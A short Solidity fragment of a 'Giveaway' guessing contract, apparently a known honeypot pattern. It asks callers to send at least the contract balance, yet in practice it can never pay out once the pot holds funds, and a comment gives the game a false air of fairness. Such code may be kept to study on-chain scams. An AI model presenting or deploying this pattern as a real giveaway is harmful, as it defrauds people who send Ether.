contract Giveaway {
function Guess(uint n) public payable {
        if(msg.value >= this.balance && n == SecretNumber && msg.value >= 0.07 ether) {
            // Previous Guesses makes the number easier to guess so you have to pay more
            msg.sender.transfer(this.balance + msg.value);
        }
    }
}